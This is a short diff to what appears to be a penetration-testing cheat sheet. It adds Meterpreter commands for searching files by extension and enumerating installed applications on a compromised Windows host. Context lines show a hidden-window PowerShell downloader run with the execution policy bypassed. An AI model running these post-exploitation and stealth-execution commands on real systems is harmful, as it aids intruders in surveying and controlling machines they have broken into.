@@ -155,3 +155,11 @@ C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1
 
 
 //there is a powershell port-scanner script if needed in the offensive powershell folder
+
+
+
+# Meterpreter 
+
+search -d /pathtobeginsearch -f *.extension
+
+run post/windows/gather/enum_applications
